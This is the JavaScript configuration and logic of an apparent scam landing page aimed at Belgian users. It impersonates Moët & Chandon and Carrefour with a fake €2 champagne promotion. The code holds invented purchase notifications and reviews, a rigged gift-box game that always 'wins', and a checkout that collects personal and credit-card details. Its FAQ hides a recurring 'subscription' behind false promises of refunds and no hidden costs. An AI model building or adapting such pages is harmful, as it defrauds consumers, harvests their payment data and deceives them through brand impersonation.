const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;
const siteKey = "moet-be";

(function (exp) {
  const countryCode = "be";
  const lang = "nl-BE";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Grootte: ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };

  // I FILL THIS INFO IN MAIN.JS
  const mainProduct = {
    header: "",
    name: "Gefeliciteerd!",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    timer: "De tijd is beperkt, haast u om uw bestelling te plaatsen!",
    text: "Om zijn 280ste verjaardag te vieren, heeft het toonaangevende champagnemerk <b>Moёt&Chandon</b> samen met de <b>Belgische</b> supermarktketen <b>Carrefour</b> een verkoop gelanceerd van 1.000 flessen Brut Impérial champagne voor slechts <b>2€</b>.",
  };

  const notifications = [
    {
      user: "Bea V***",
      location: "Brussel, België",
      action: "Heeft net Moet&Chandon Brut Imperial gekocht voor 2,00 €!",
      timeago: "15 seconden geleden",
    },
    {
      user: "Tessa B***",
      location: "Antwerpen, België",
      action: "Heeft net Moet&Chandon Brut Imperial gekocht voor 2,00 €!",
      timeago: "25 seconden geleden",
    },
  ];

  const reviewsArr = [
    {
      name: "Lucas",
      time: "1 dag geleden",
      header: "Dit is geweldig!",
      product: "26468782",
      image: "./assets/proof1.jpg",
      review: "Ik hoorde onlangs over deze actie en besloot om het te kopen. Bedankt Moet&Chandon voor deze verkoop.",
    },
    {
      name: "Anton",
      time: "2 dagen geleden",
      header: "Fantastisch! Ik ben sprakeloos.",
      product: "26468789",
      image: "./assets/proof2.jpg",
      review: "Bedankt. Het pakket werd zeer snel geleverd.",
    },
    {
      name: "Josefien",
      time: "2 dagen geleden",
      header: "Gewoon geweldig.",
      product: "26468783",
      image: "./assets/proof3.jpg",
      review: "Mijn man wilde niet dat ik meedeed omdat we nog nooit van deze verkoop hadden gehoord, maar toen mijn pakket aankwam, was hij erg blij.",
    },
    {
      name: "Nico",
      time: "4 dagen geleden",
      header: "Hij houdt ervan.",
      image: "./assets/proof4.jpg",
      review: "Ik wilde deze fles al heel lang en heb er eindelijk een gekregen.",
    },
    {
      name: "Jan",
      time: "7 dagen geleden",
      header: "Wow, ik ben absoluut onder de indruk van dit product!",
      product: "26468784",
      review: "Ongelooflijk. Een dure en kwalitatief hoogwaardige fles voor slechts 2,00 €. Bedankt!",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "BEOORDELINGEN EN RECENSIES",
    percent: "99%",
    rec: "Recensies van deze actie",
  };

  const questions = {
    _of: "Vraag {1} van {2}: ",
    arr: [
      {
        q: "Heb je ooit Moet&Chandon Brut Imperial gedronken?",
        a: ["Ja", "Nee"],
      },
      {
        q: "Waar heb je deze actie gevonden?",
        a: ["Op de officiële website", "Facebook-advertenties", "Aanbevolen door een vriend"],
      },
      {
        q: "Voor welk doel gebruik je Moet&Chandon Brut Imperial?",
        a: ["Als een cadeau", "Voor persoonlijk gebruik"],
      },
    ],
  };

  const check = {
    title: "Uw antwoorden worden gecontroleerd.",
    secondTitle: "Laden...",
    arr: [
      "U heeft vraag 3/3 beantwoord",
      "Geen eerdere onderzoeken van uw IP.",
      "Cadeaus worden geladen...",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Gefeliciteerd, u heeft met succes bevestigd dat u een echte persoon bent.",
        button: "OK",
        text: `
      <center>
      Vandaag, op {date}, heeft u de kans om uw Moet&Chandon Brut Imperial  te ontvangen.
        <br><br>
        U hoeft alleen maar het juiste geschenk te kiezen.
        <br><br>
        U heeft 3 opties, veel geluk!
      </center>
    `,
      },
    },
    first: {
      texts: {
        header: "Oh nee...",
        button: "OK",
        text: `
      <center>
      Sorry, maar dit geschenk is leeg. U heeft nog 2 pogingen. Veel succes!
      </center>
    `,
      },
    },
    win: {
      texts: {
        header: `Gefeliciteerd! U heeft gewonnen!`,
        button: "OK",
        text: `
      <center>
        <p style="color: #b51817">
        U heeft Moet&Chandon Brut Imperial gewonnen!
        </p>
        <br>
        1) Klik hieronder op "OK" om naar de betaalpagina voor de verzending te gaan.
         <br><br>
        2) Vul het formulier in en betaal uw bestelling om Moet&Chandon te ontvangen.
        <br><br>
        3) Het pakket wordt binnen 5 tot 7 dagen geleverd.
      </center>
    `,
      },
    },
  };

  const faqs = [
    {
      question: "Hoe lang moet ik op mijn prijs wachten?",
      answer: "Het duurt meestal 5 tot 7 werkdagen.",
    },
    {
      question: "Zijn er verborgen kosten?",
      answer: "Absoluut niet. Zodra u uw prijs heeft gewonnen en uw gegevens heeft ingevoerd, zorgen wij voor de rest. De verzendkosten zijn voor onze rekening!",
    },
    {
      question: "Ik ben een winnaar, waarom moet ik vragen beantwoorden/een geschenk kiezen?",
      answer: "U bent nog geen winnaar, maar u bent een van de 10 geselecteerden die kunnen proberen onze prijs te winnen...",
    },
    {
      question: "Hoe kan ik de prijs ontvangen als ik win?",
      answer: "U moet eerst uw afleveradres en contactgegevens invoeren, daarna zal ons systeem u verder leiden. U moet dan bewijzen dat u geen robot bent, omdat de prijs alleen wordt aangeboden aan echte mensen.",
    },
    {
      question: "Waarom moet ik 2,00 € voor de prijs betalen?",
      answer: "2,00 € is geen prijs - het is een abonnement dat bewijst dat u een echt persoon bent. Alle betalingen worden na goedkeuring terugbetaald.",
    },
    {
      question: "Ik kan mijn creditcard niet gebruiken, de transactie is mislukt?",
      answer: "Als u uw creditcard niet kunt gebruiken, blokkeert uw bank de transactie: u moet uw bankrekening verifiëren.",
    },
  ];

  const cartSteps = {
    personal: {
      title: "Persoonlijke gegevens",
      fields: {
        name: {
          enabled: true,
          field: "Voornaam",
        },
        family: {
          enabled: true,
          field: "Achternaam",
        },
        phone: {
          enabled: true,
          field: "Telefoonnummer",
        },
        email: {
          enabled: true,
          field: "E-mail",
        },
      },
    },
    delivery: {
      title: "Levering",
      fields: {
        city: {
          enabled: true,
          field: "Stad",
        },
        address: {
          enabled: true,
          field: "Leveradres",
        },
        zip: {
          enabled: true,
          field: "Postcode",
        },
      },
    },
    payment: {
      title: "Betaalmethoden",
      creditCard: "Online betaling met creditcard",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Overzicht van de bestelling",
      oldPrice: "",
      newPrice: "2,00 €",
      size: "Grootte",
      subTotal: {
        title: "Bestelwaarde",
        amount: "2,00 €",
      },
      delivery: {
        title: "Levering",
        amount: "0,00 €",
      },
      total: {
        title: "Totaal",
        amount: "2,00 €",
      },
      checkoutButton: "Betaal uw bestelling",
    },
  };

  const products = [
    {
      id: "26468782",
      name: "Moet&Chandon Brut Imperial",
      miniImg: "./assets/bottle.png",

      images: ["./assets/slide_1.jpg",
        "./assets/slide_2.jpg"
      ],
    },
  ];

  const footer = {
    cr: "© 2024 Moet&Chandon. Alle rechten voorbehouden.",
  };


  const pathImgBox = {
    lid: "./assets/box-lid.png",
    lidIOs: "./assets/box-lid-ios.png",
    inner: "./assets/box-inner.png",
    innerGift: "./assets/box-inner-gift.png",
    box: "./assets/box.png",
    boxModal: "./assets/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
    faqs,
  };
})(window);

const starupCheck = () => {
  if (getCookie("__firstStart") != null) {
    return;
  } else {
    localStorage.clear();
    clearSiteSpecificCookies();
    setCookie("__firstStart", true);
  }
};

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
  starupCheck();
  timerInit();
});

function setCookie(name, value, days = 2) {
  const expires = new Date(Date.now() + days * 864e5).toUTCString();
  document.cookie = `${siteKey + name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
}

function getCookie(name) {
  var dc = document.cookie;
  var prefix = (siteKey + name) + "=";
  var begin = dc.indexOf("; " + prefix);
  if (begin == -1) {
    begin = dc.indexOf(prefix);
    if (begin != 0) return null;
  }
  else {
    begin += 2;
    var end = document.cookie.indexOf(";", begin);
    if (end == -1) {
      end = dc.length;
    }
  }
  return decodeURI(dc.substring(begin + prefix.length, end));
}

const clearAllCookies = () => document.cookie.split(';').forEach(c => document.cookie = c.replace(/^ +/, '').replace(/=.*/, `=;expires=${new Date().toUTCString()};path=/`));

const clearSiteSpecificCookies = () => {
  document.cookie.split(';').forEach(cookie => {
    // Trim any leading spaces from the cookie string
    const trimmedCookie = cookie.trim();

    // Extract the cookie name
    const cookieName = trimmedCookie.split('=')[0];

    // Check if the cookie name starts with the siteKey
    if (cookieName.startsWith(siteKey)) {
      // Set the cookie's expiration to a past date to delete it
      document.cookie = `${cookieName}=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/`;
    }
  });
};



const lsSelectProduct = (val) =>
  setCookie("__selected_product", val);

const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = getCookie("__selected_product");
  // let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }

  return products.find((pr) => pr.id === ind);
};

const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => {
  setCookie("__selected_size", val);
  // localStorage.setItem("__selected_size", val);
};

const lsGetSelectedSizeInd = () => {
  const ind = getCookie("__selected_size");
  // const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => setCookie("__step", val);
// const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = getCookie("__step", val);
  // const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

function proceedWithoutCheckout() {
  window.location.href = "https://{trackingdomain}/click/";
}

const enableLoader = () => {
  const loader = document.querySelector(".loader_container");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {

  const loader = document.querySelector(".loader_container");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");

};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};
